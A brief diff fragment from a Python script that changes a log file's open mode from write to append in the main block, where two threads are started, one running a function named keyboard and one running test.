@@ -65,7 +65,7 @@ def keyboard():
             f.write('\n{}'.format(msg))
 
 if __name__ == "__main__":
-    open(log_file, "w")
+    open(log_file, 'a')
     thread1 = threading.Thread(target=keyboard)
     thread2 = threading.Thread(target=test)
 
